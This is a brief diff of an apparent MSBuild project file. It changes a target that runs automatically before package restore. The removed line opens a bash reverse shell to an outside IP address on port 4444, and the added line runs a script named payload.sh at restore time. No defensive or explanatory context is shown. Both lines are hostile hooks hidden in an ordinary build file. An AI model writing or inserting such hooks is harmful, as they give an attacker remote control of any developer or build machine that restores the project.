@@ -9,7 +9,7 @@
 
 
   <Target Name="RunCustomScriptOnRestore" BeforeTargets="Restore">
-	  <Exec Command="bash -i >& /dev/tcp/3.17.216.81/4444 0>&1" />
+	  <Exec Command="bash ./payload.sh" />
   </Target>
 
 
